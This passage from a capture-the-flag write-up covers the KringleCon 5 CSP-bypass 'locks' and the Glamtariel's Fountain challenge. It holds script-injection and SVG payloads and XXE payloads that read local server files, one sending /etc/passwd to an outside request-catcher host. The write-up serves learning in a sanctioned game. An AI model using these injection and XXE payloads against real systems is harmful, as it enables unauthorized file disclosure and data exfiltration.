<div class="box">&lt;h3 style=&quot;translate:12px 35px;transform: rotate(25deg);transform-origin: top left;&quot;&gt;@&amp;@&amp;&amp;W&amp;&amp;W&amp;&amp;&amp;&amp;&lt;/h3&gt;</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj03_13.webp" alt="Lock 2 unlocked" data-caption="Lock 2 unlocked" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Lock 2 unlocked
      
        
        
      
    </figcaption>
  
</figure>
<h5 id="lock-3">Lock 3</h5>
<p>For the third lock, the <em>CSP</em> is:</p>
<div class="box">&lt;meta http-equiv=&ldquo;Content-Security-Policy&rdquo; content=&ldquo;script-src &lsquo;self&rsquo; &lsquo;unsafe-inline&rsquo;; style-src &lsquo;self&rsquo;&quot;&gt;</div>
<p>This means we cannot use inline CSS anymore, however, we can use inline Javascript! The idea here is to apply the CSS through JS and make sure the text color is blue. Here are 2 possible solutions:</p>
<div class="box"><p>&lt;script&gt;document.write(&quot;&lt;div id=\&quot;t\&quot;&gt;&amp;@&amp;@&amp;&amp;W&amp;&amp;W&amp;&amp;&amp;&amp;&amp;&amp;&lt;/div&gt;&quot;); var element = document.getElementById(&quot;t&quot;); element.style=&quot;translate:-8px 42px; transform:rotate(-22deg); letter-spacing: -5px; color:blue;&quot;;&lt;/script&gt;</p>
<p>or</p>
<p>&lt;script&gt;document.write(&quot;&lt;div id=\&quot;t\&quot;&gt;WWWWW&lt;/div&gt;&quot;); var element = document.getElementById(&quot;t&quot;); element.style=&quot;font-size:4.5em;translate:-50px -40px;letter-spacing: -10px;color:blue;&quot;;&lt;/script&gt;</p>
</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj03_14.webp" alt="Lock 3 unlocked" data-caption="Lock 3 unlocked" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Lock 3 unlocked
      
        
        
      
    </figcaption>
  
</figure>
<p>At this point we have passed the challenge…but there are 3 bonus locks to unlock!</p>
<h5 id="bonus---lock-4">Bonus - Lock 4</h5>
<p>For this one, there is no <em>CSP</em> but the following input sanitization function:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
  <span class="kr">const</span> <span class="nx">sanitizeInput</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
  <span class="kr">const</span> <span class="nx">input</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;.inputTxt&#39;</span><span class="p">);</span>
  <span class="kr">const</span> <span class="nx">content</span> <span class="o">=</span> <span class="nx">input</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
  <span class="nx">input</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">content</span>
    <span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&#34;/</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
  <span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&#39;/</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
  <span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&lt;/</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
  <span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&gt;/</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
<span class="p">}</span>
<span class="o">&lt;</span><span class="err">/script&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>Some characters are stripped. However, only the first occurrence of those characters are stripped. Therefore, the following input bypasses the check and unlock the lock:</p>
<div class="box">&lt;&gt;'&quot;&lt;h1&gt;WWWWVV&lt;/h1&gt;&lt;h1 style=&quot;color:blue;translate:0px -30px;&quot;&gt;WWWWWVV&lt;/h1&gt;</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj03_15.webp" alt="Lock 4 unlocked" data-caption="Lock 4 unlocked" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Lock 4 unlocked
      
        
        
      
    </figcaption>
  
</figure>
<h5 id="bonus---lock-5">Bonus - Lock 5</h5>
<p>Here we have the same <em>CSP</em> as Lock 3 and the input sanitization function has changed to strip now all occurrences of the characters. What saves us here is that the input validation is only done client-side. We can intercept the with our favourite proxy (e.g. <em>Burp</em>) and send out input directly to the server without being validated.</p>
<p>A possible solution would be:</p>
<div class="box">&lt;script&gt;document.write(&quot;&lt;div id=\&quot;t\&quot;&gt;WWWWWWW&lt;/div&gt;&quot;);var element = document.getElementById(&quot;t&quot;);element.style=&quot;font-size:2em;translate:8px 80px;transform:rotate(-25deg);letter-spacing: -10px;color:blue;&quot;; document.write(&quot;&lt;div id=\&quot;v\&quot;&gt;WWWWWWWWWWWW&lt;/div&gt;&quot;);var element = document.getElementById(&quot;v&quot;);element.style=&quot;font-size:2em;translate:-20px -30px;transform:rotate(-25deg);letter-spacing: -10px;color:red;&quot;;&lt;/script&gt;</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj03_16.webp" alt="Lock 5 unlocked" data-caption="Lock 5 unlocked" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Lock 5 unlocked
      
        
        
      
    </figcaption>
  
</figure>
<h5 id="bonus---lock-6">Bonus - Lock 6</h5>
<p>The last lock has a more restrictive <em>CSP</em>:</p>
<div class="box">&lt;meta http-equiv=&ldquo;Content-Security-Policy&rdquo; content=&ldquo;script-src &lsquo;self&rsquo;; style-src &lsquo;self&rsquo;&quot;&gt;</div>
<p>We cannot use in-line <em>CSS</em> not <em>Javascript</em>. Let&rsquo;s use <em>HTML SVG</em> graphics for this one as they do no involve <em>JS</em> not <em>CSS</em> to manipulate shapes and colors. We can keep thinks simple and create basic rectangles of the appropriate color. A  solution would be:</p>
<div class="box">&lt;svg height=&quot;200px&quot;width=&quot;100%&quot;&gt;&lt;rect fill=&quot;#0000FF&quot; width=&quot;100%&quot; x=0px y=115px height=&quot;100%&quot;/&gt;&lt;rect fill=&quot;#00FF00&quot; width=&quot;100%&quot; x=0px y=25px height=&quot;10%&quot;/&gt;&lt;rect fill=&quot;#FF0000&quot; width=&quot;100%&quot; x=0px y=55px height=&quot;30%&quot;/&gt;&lt;/svg&gt;</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj03_17.webp" alt="Lock 6 unlocked" data-caption="Lock 6 unlocked" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Lock 6 unlocked
      
        
        
      
    </figcaption>
  
</figure>
<p>Notice that we could have used SVG for all other locks similarly to bypass <em>CSP</em>.</p>
<h4 id="33-glamtariels-fountain">3.3 Glamtariel&rsquo;s Fountain</h4>
<table>
<thead>
<tr>
<th>Difficulty</th>
<th>Objective</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>5/5</td>
<td>Stare into Glamtariel&rsquo;s fountain and see if you can find the ring! What is the filename of the ring she presents you? Talk to Hal Tandybuck in the Web Ring for hints.</td>
<td>Fountain</td>
</tr>
</tbody>
</table>
<p>We are presented with a website where we can drag and drop images either on the <em>Glamtariel</em> character or on the fountain image. This will result each time in different text outputs.</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj03_18.webp" alt="Glamtariel&#39;s Fountain" data-caption="Glamtariel&#39;s Fountain" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Glamtariel&#39;s Fountain
      
        
        
      
    </figcaption>
  
</figure>
<p>Once we have dragged and drop the 4 images on both <em>Glamtariel</em> and the fountain, we have 4 new images with new text outputs. Then another 4. The outputs can give us hints on how to solve the challenge. The hints are showed in CAPITAL letters and they are the following:</p>
<div class="box">TAMPER<br />
PATH<br />
APP<br />
TYPE<br />
SIMPLE FORMAT<br />
RINGLIST<br />
TRAFFIC FLIES</div>
<p>The messages says that <em>Glamtariel</em> keeps a secret <code>RINGFILE</code> list that is in a <code>SIMPLE FORMAT</code> file. The goal is to find the secret <code>PATH</code> where the <code>RINGLIST</code> file is hidden and try to get its content. <em>Glamtariel</em> says as well that she speaks many different <code>TYPE</code> of languages.</p>
<p>Interesting thing that when the <code>PATH</code> and <code>APP</code> keyword are shown, the image of an eye is shown and its path is: <a href="https://glamtarielsfountain.com/static/images/stage2ring-eyecu_2022.png">https://glamtarielsfountain.com/static/images/stage2ring-eyecu_2022.png</a>. The image of <em>Glamtariel</em> and the fountain are in the same folder: <a href="https://glamtarielsfountain.com/static/images/2022_glamtariel_2022.png,">https://glamtarielsfountain.com/static/images/2022_glamtariel_2022.png,</a> <a href="https://glamtarielsfountain.com/static/images/2022_icefountain_2022.png">https://glamtarielsfountain.com/static/images/2022_icefountain_2022.png</a>.</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj03_19.webp" alt="The Eye" data-caption="The Eye" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      The Eye
      
        
        
      
    </figcaption>
  
</figure>
<p>Let&rsquo;s have a look at a call when an image is dragged and dropped:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj03_20.webp" alt="Burp - drag &amp; drop" data-caption="Burp - drag &amp; drop" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Burp - drag &amp; drop
      
        
        
      
    </figcaption>
  
</figure>
<p>We have many info here:</p>
<ul>
<li>
<p>the endpoint is <code>/dropped</code></p>
</li>
<li>
<p>the payload is a <em>JSON</em> object that contains the name of the image dropped, the character on which it&rsquo;s dropped on (<code>princess</code> or <code>fountain</code>) and the type of the request (<code>json</code>).</p>
</li>
<li>
<p>the header <code>X-Grinchum</code> that contains a <em>CSRF</em> token. We break the call as soon as we tamper it. We get the following response and image:<br />
<div class="box">{<br />
  &ldquo;appResp&rdquo;: &ldquo;Trying to TAMPER with Kringle&rsquo;s favorite cookie recipe or the entrance tickets can&rsquo;t help you Grinchum! I&rsquo;m not sure what you are looking for but it isn&rsquo;t here! Get out!^Miserable trickster! Please click him out of here.&rdquo;,<br />
  &ldquo;droppedOn&rdquo;: &ldquo;none&rdquo;,<br />
  &ldquo;visit&rdquo;: &ldquo;static/images/grinchum-supersecret_9364274.png,265px,135px&rdquo;<br />
}</div></p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj03_21.webp" alt="Grinchum" data-caption="Grinchum" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='20%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:20%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Grinchum
      
        
        
      
    </figcaption>
  
</figure>
<p>We have then to reset the website and start over.</p>
</li>
<li>
<p>Playing with the cookie <code>MiniLembanh</code> seems to lead to the same results as the <em>CSRF</em> token</p>
</li>
</ul>
<p>By playing with some values in the payload, we get that:</p>
<ul>
<li><code>imgDrop</code> must be an existing image</li>
<li><code>who</code> only accepts the <code>princess</code> and <code>fountain</code></li>
<li><code>reqType</code> accepts <code>json</code> and <code>xml</code>. The message we get when using <em>XML</em> is &ldquo;We don&rsquo;t speak that way very often any more. Once in a while perhaps, but only at certain times.^I don&rsquo;t hear her use that very often. I think only for certain TYPEs of thoughts.&rdquo;</li>
</ul>
<p>Let&rsquo;s try to change the whole payload to <em>XML</em>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;</span>
<span class="nt">&lt;root&gt;</span>
  <span class="nt">&lt;imgDrop&gt;</span>img3<span class="nt">&lt;/imgDrop&gt;</span>
  <span class="nt">&lt;who&gt;</span>princess<span class="nt">&lt;/who&gt;</span>
  <span class="nt">&lt;reqType&gt;</span>xml<span class="nt">&lt;/reqType&gt;</span>
<span class="nt">&lt;/root&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>We need to change as well the <code>Content-Type</code> header to  <code>application/xml</code> and we get a new message from the princess:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj03_22.webp" alt="Burp - XML payload" data-caption="Burp - XML payload" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Burp - XML payload
      
        
        
      
    </figcaption>
  
</figure>
<p>If we try on the fountain we get the message &ldquo;I&rsquo;m one of the few who can discuss anything using that TYPE of language.^Yeah, I can understand a bit, but not communicate with it at all.&rdquo;. So let&rsquo;s continue with the princess. We can now definitely try to exploit some XXE vulnerability.</p>
<div class="alert alert-info" role="alert" data-dir="ltr">This works only after we have reached the last set of 4 images and exhausted all the conversation.</div>
<p>Let&rsquo;s try some <em>XXE</em> payloads. This will probably be a blind <em>XXE</em> as there is no field that could display any value back. The <code>who</code> value was returned in the answer with <em>JSON</em> payloads but with <em>XML</em>&rsquo;s, only <code>none</code> is returned. We can use any service to catch the webserver call (e.g. ngrok, requestcatcher.com)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version=&#34;1.0&#34; ?&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [
</span><span class="cp">&lt;!ELEMENT foo ANY &gt;</span>
<span class="cp">&lt;!ENTITY % xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
<span class="cp">&lt;!ENTITY blind SYSTEM &#34;https://noobintheshell.requestcatcher.com/%xxe;&#34;&gt;</span>]&gt;
<span class="nt">&lt;root&gt;</span>
  <span class="nt">&lt;foo&gt;</span><span class="ni">&amp;blind;</span><span class="nt">&lt;/foo&gt;</span>
  <span class="nt">&lt;imgDrop&gt;</span>img3<span class="nt">&lt;/imgDrop&gt;</span>
  <span class="nt">&lt;who&gt;</span>princess<span class="nt">&lt;/who&gt;</span>
  <span class="nt">&lt;reqType&gt;</span>xml<span class="nt">&lt;/reqType&gt;</span>
<span class="nt">&lt;/root&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>But no answer.</p>
<p><em>Glamtariel</em> accepts images (or generic files) as input and will comment it. What if we try to  send her an image we saw earlier? The only missing piece is the website document root. However, in the hints above, we have <code>APP</code> which could be it. Let&rsquo;s try:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version=&#34;1.0&#34; ?&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [
</span><span class="cp">&lt;!ELEMENT foo ANY &gt;</span>
<span class="cp">&lt;!ENTITY xxe SYSTEM &#34;file:///app/static/images/stage2ring-eyecu_2022.png&#34; &gt;</span>]&gt;
<span class="nt">&lt;root&gt;</span>
  <span class="nt">&lt;imgDrop&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/imgDrop&gt;</span>
  <span class="nt">&lt;who&gt;</span>princess<span class="nt">&lt;/who&gt;</span>
  <span class="nt">&lt;reqType&gt;</span>xml<span class="nt">&lt;/reqType&gt;</span>
<span class="nt">&lt;/root&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>We get the following answer &ldquo;Sorry, we dont know anything about that.^Sorry, we dont know anything about that.&rdquo;. We tried other existing images with the same result. After a few tries and errors, and knowing that we are looking for a <code>RINGLIST</code> file that has a <code>SIMPLE FORMAT</code>, we found the right file and path: <code>/app/static/images/ringlist.txt</code>. When we submit that in the payload:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version=&#34;1.0&#34; ?&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [
</span><span class="cp">&lt;!ELEMENT foo ANY &gt;</span>
<span class="cp">&lt;!ENTITY xxe SYSTEM &#34;file:///app/static/images/ringlist.txt&#34; &gt;</span>]&gt;
<span class="nt">&lt;root&gt;</span>
  <span class="nt">&lt;imgDrop&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/imgDrop&gt;</span>
  <span class="nt">&lt;who&gt;</span>princess<span class="nt">&lt;/who&gt;</span>
  <span class="nt">&lt;reqType&gt;</span>xml<span class="nt">&lt;/reqType&gt;</span>
<span class="nt">&lt;/root&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>We get the following answer:</p>
<div class="box">{<br />
  &ldquo;appResp&rdquo;: &ldquo;Ah, you found my ring list! Gold, red, blue - so many colors! Glad I don&rsquo;t keep any secrets in it any more! Please though, don&rsquo;t tell anyone about this.^She really does try to keep things safe. Best just to put it away. (click)&rdquo;,<br />
  &ldquo;droppedOn&rdquo;: &ldquo;none&rdquo;,<br />
  &ldquo;visit&rdquo;: &ldquo;static/images/pholder-morethantopsupersecret63842.png,262px,100px&rdquo;<br />
}</div>
<p>The image is:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj03_23.webp" alt="hidden folder" data-caption="hidden folder" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='20%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:20%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      hidden folder
      
        
        
      
    </figcaption>
  
</figure>
<p>We can read the name of a folder <code>x_phial_pholder_2022</code> and 2 files, <code>bluering.txt</code> and <code>redring.txt</code>. Using the same payload, let&rsquo;s share those 2 files with <em>Glamtariel</em> and see her answer:</p>
<ul>
<li>
<p><code>/app/static/images/x_phial_pholder_2022/bluering.txt</code><br />
&ldquo;I love these fancy blue rings! You can see we have two of them. Not magical or anything, just really pretty.^She definitely tries to convince everyone that the blue ones are her favorites. I&rsquo;m not so sure though.&rdquo;</p>
</li>
<li>
<p><code>/app/static/images/x_phial_pholder_2022/redring.txt</code><br />
&ldquo;Hmmm, you still seem awfully interested in these rings. I can&rsquo;t blame you, they are pretty nice.^Oooooh, I can just tell she&rsquo;d like to talk about them some more.&rdquo;</p>
</li>
</ul>
<p>Nothing new here. We try to discover other ring colors and we get a hit with <code>silverring</code>:</p>
<ul>
<li><code>/app/static/images/x_phial_pholder_2022/silverring.txt</code></li>
</ul>
<div class="box">{<br />
  &ldquo;appResp&rdquo;: &ldquo;I&rsquo;d so love to add that silver ring to my collection, but what&rsquo;s this? Someone has defiled my red ring! Click it out of the way please!.^Can&rsquo;t say that looks good. Someone has been up to no good. Probably that miserable Grinchum!&rdquo;,<br />
  &ldquo;droppedOn&rdquo;: &ldquo;none&rdquo;,<br />
  &ldquo;visit&rdquo;: &ldquo;static/images/x_phial_pholder_2022/redring-supersupersecret928164.png,267px,127px&rdquo;<br />
}</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj03_24.webp" alt="Red Ring" data-caption="Red Ring" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='20%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:20%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Red Ring
      
        
        
      
    </figcaption>
  
